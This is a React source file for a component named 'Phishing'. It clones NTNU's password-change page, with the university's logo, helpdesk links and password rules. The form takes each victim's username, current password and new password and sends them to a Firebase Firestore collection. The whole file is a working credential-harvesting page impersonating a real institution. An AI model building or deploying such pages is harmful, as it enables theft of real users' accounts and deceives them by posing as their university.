import {
    Title,
    Text,
    Container,
    Space,
    Group,
    Select,
    TextInput,
    PasswordInput,
    Button,
    Divider,
    List,
    ThemeIcon,
  } from "@mantine/core";
  import { IconCheck } from "@tabler/icons";
  import { FormEvent, useState } from "react";
  import { db } from "../firebaseConfig"; // Adjust the path as needed
  import { collection, addDoc } from "firebase/firestore";
  
  const Phishing = () => {
    const handleSubmit = async (e: FormEvent) => {
      e.preventDefault();
    
      const formData = {
        username: (e.target as HTMLFormElement).username.value,
      oldPassword: (e.target as HTMLFormElement).oldpw.value,
      newPassword: (e.target as HTMLFormElement).pw1.value,
      };
    
      try {
        await addDoc(collection(db, "submissions"), formData);
        console.log("Data submitted successfully");
      } catch (error) {
        console.error("Error submitting data:", error);
      }
    };
      
    return (
      <Container m="auto" size="sm" p="md">
      <div style={{ textAlign: "center", marginBottom: "20px" }}>
        <a href="http://www.ntnu.no">
          <img
            src="https://bas.ntnu.no/img/ntnu_med_slagord_bredde_bokmaal.png"
            alt="NTNU homepage"
            style={{ maxWidth: "100%" }}
          />
        </a>
      </div>

      <Space h="xl" />

      <div>
        <Title order={2}>Change password</Title>
        <Text mt="md">
          If you do not remember your current password, you can either, as a
          student,{" "}
          <Text component="a" href="/reset/" color="blue">
            reset your password with PIN
          </Text>
          , or contact{" "}
          <Text component="a" href="http://ntnu.no/orakel" target="_blank" color="blue">
            Orakeltjenesten
          </Text>{" "}
          (735) 91500.
        </Text>

        {/* Form */}
        <form onSubmit={handleSubmit}>
          <div style={{ marginTop: "20px", maxWidth: "60%", marginLeft: "auto", marginRight: "auto" }}>
            <TextInput label="Username" name="username" placeholder="Enter your username" required />
            <PasswordInput
              label="Current password"
              name="oldpw"
              placeholder="Enter your current password"
              required
              mt="md"
            />
            <PasswordInput
              label="New password (at least 10 characters)"
              name="pw1"
              placeholder="Enter your new password"
              required
              mt="md"
            />
            <PasswordInput
              label="Retype new password (at least 10 characters)"
              name="pw2"
              placeholder="Retype your new password"
              required
              mt="md"
            />
          </div>

          <Space h="md" />
          <Divider my="md" />
          <Space h="md" />

          <Text>
            The new password must be different from your current password.
            Password must be at least 10 characters long and contain at least
            one character from three of these 4 groups:
          </Text>

          <List
            spacing="xs"
            size="sm"
            icon={
              <ThemeIcon color="blue" size={20} radius="xl">
                <IconCheck size={14} />
              </ThemeIcon>
            }
            style={{ marginTop: "10px" }}
          >
            <List.Item>Capital letters <b>A-Z</b></List.Item>
            <List.Item>Lower case letters <b>a-z</b></List.Item>
            <List.Item>Digits <b>0-9</b></List.Item>
            <List.Item>
              Special characters <b>!#()*+,.=?@[]_{}-</b>
              <Text component="em" size="xs" color="dimmed">
                (only these special characters are allowed)
              </Text>
            </List.Item>
          </List>

          <Group position="center" mt="md">
            <Button type="submit" color="blue">
              Change password
            </Button>
          </Group>
        </form>
      </div>
    </Container>
    );
  };
  
  export default Phishing;
  